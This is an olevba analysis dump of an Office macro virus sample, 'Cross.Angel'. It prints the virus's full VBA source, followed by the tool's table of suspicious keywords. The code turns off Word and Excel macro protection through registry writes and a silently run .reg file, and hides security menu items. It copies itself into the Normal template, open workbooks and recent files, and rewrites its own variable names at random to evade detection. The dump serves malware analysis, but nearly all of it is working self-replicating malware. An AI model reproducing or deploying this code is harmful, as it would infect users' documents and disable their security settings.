olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Across.b-6bf2542f3c80c3cc4dfcc6b4ffdcadceb67f53b4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Across.b-6bf2542f3c80c3cc4dfcc6b4ffdcadceb67f53b4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Cross.Angel
Private Sub Document_Close()
On Error Resume Next
Const OurID = "' Cross.Angel", OurSize = 130, O2KID = "9.0", MacID = "Macro", ToolsID = "Tools", RegVal = &H1, RegVal_ = &H0, Zero = 0, One = 1, ControlID = 12, CrossID = "excel.application", ClassID = "DieseArbeitsmappe"
If Application.Version = O2KID Then
    Application.CommandBars(MacID).Controls((One + One + One)).Enabled = (Rnd * Zero)
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = RegVal
Else
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = RegVal_
    Application.CommandBars(ToolsID).Controls(ControlID).Enabled = (Rnd * Zero)
    Options.VirusProtection = (Rnd * Zero)
End If
Options.SaveNormalPrompt = (Rnd * Zero)
OurCode = PolyIt(ThisDocument.VBProject.VBComponents(One).CodeModule.Lines(One, OurSize))
If MacroContainer = ActiveDocument Then Set Newhost = NormalTemplate Else Set Newhost = ActiveDocument
With Newhost.VBProject.VBComponents(One).CodeModule
    If .Lines(One, One) <> OurID Then
        .DeleteLines One, .CountOfLines
        .InsertLines One, OurCode
        If Newhost = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
    End If
End With
If System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> One Then
Set Other = GetObject(, CrossID)
If Other = "" Then Set Other = CreateObject(CrossID): QuitUs = One
If QuitUs <> One Then
    For Each Target In Other.Workbooks
       With Target.VBProject.VBComponents(ClassID).CodeModule
            If .Lines(One, One) <> OurID Then
                .DeleteLines One, .CountOfLines
                .InsertLines One, OurCode
                If Target.Path <> "" Then Target.Save Else Target.SaveAs Target.FullName
            End If
        End With
    Next
Else
    For Target = One To Other.Application.RecentFiles.Maximum
        Other.Application.RecentFiles(Target).Open
            With Other.Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(ClassID).CodeModule
                If .Lines(One, One) <> OurID Then
                    .DeleteLines One, .CountOfLines
                    .InsertLines One, OurCode
                End If
            End With
        Other.Application.Workbooks(Application.RecentFiles(1).Name).Close One
    Next
    Other.Quit
End If
System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = One
End If
If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
If System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> One Then System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = One
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Const OurID = "' Cross.Angel", OurSize = 130, O2KID = "9.0", MacID = "Macro", ToolsID = "Tools", Zero = 0, One = 1, ControlID = 10, CrossID = "word.application", ClassID = "DieseArbeitsmappe"
If UCase(Dir("c:\.reg")) <> ".REG" Then
Open "c:\.reg" For Output As #1
    Print #1, "REGEDIT4"
If Application.Version = O2KID Then
    Application.CommandBars(MacID).Controls((One + One + One)).Enabled = (Rnd * Zero)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
    Print #1, """Level""=dword:00000001"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
    Print #1, """Level""=dword:00000001"
Else
    Application.CommandBars(ToolsID).Controls(ControlID).Enabled = (Rnd * Zero)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
    Print #1, """Options6""=dword:00000000"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
    Print #1, """EnableMacroVirusProtection""=""0"""
End If
Close #1
End If
Shell "regedit /s c:\.reg", vbHide
OurCode = PolyIt(ThisWorkbook.VBProject.VBComponents(ClassID).CodeModule.Lines(One, OurSize))
For Each Target In Application.Workbooks
    With Target.VBProject.VBComponents(ClassID).CodeModule
        If .Lines(One, One) <> OurID Then
            .DeleteLines One, .CountOfLines
            .InsertLines One, OurCode
            If Target.Path <> "" Then Target.Save Else Target.SaveAs Target.FullName
        End If
    End With
Next
If Application.Workbooks.Count = One Then
    Application.WindowState = xlMinimized
    For Target = One To Application.RecentFiles.Maximum
        Application.RecentFiles(Target).Open
            With Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(ClassID).CodeModule
                If .Lines(One, One) <> OurID Then
                    .DeleteLines One, .CountOfLines
                    .InsertLines One, OurCode
                End If
            End With
        Application.Workbooks(Application.RecentFiles(1).Name).Close One
    Next
End If
Set Other = GetObject(, CrossID)
If Other = "" Then Set Other = CreateObject(CrossID): QuitUs = One
If Other.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> One Then Other.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = One
If Other.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> One Then
With Other.NormalTemplate.VBProject.VBComponents(One).CodeModule
    If .Lines(One, One) <> OurID Then
        .DeleteLines One, .CountOfLines
        .InsertLines One, OurCode
        Other.NormalTemplate.Save
        Other.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = One
    End If
End With
End If
If QuitUs = One Then Other.Quit Else If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
End Sub
Private Function PolyIt(OurCode) 'JSMP v1.2
Dim Variable(0 To 20): Randomize
VarPos = 1: Variable(0) = "OurCode": Variable(1) = "PolyIt": Variable(2) = "Variable": Variable(3) = "VarLoop": Variable(4) = "NewVar": Variable(5) = "VarPos": Variable(6) = "OurID": Variable(7) = "OurSize": Variable(8) = "O2KID": Variable(9) = "MacID": Variable(10) = "ToolsID": Variable(11) = "RegVal": Variable(12) = "Zero": Variable(13) = "One": Variable(14) = "ControlID": Variable(15) = "CrossID": Variable(16) = "ClassID": Variable(17) = "Newhost": Variable(18) = "Other": Variable(19) = "QuitUs": Variable(20) = "Target"
For VarLoop = 0 To 20
NewVar = Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74))
Do
VarPos = InStr(VarPos + 1, OurCode, Variable(VarLoop))
If VarPos Then OurCode = Mid(OurCode, 1, (VarPos - 1)) & NewVar & Mid(OurCode, (VarPos + Len(Variable(VarLoop))), Len(OurCode))
Loop While VarPos
Next
PolyIt = OurCode
End Function
'Cross.Angel written by jackie twoflower /Lz0NT /MVT
'Uses Jackie's Stupid Macro Poly v1.2
'Office97 and Office2000 compatible | New Cross area!
'Hey my angel, this is for you. Why you left me?
'I can't live without you! I luv ya!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
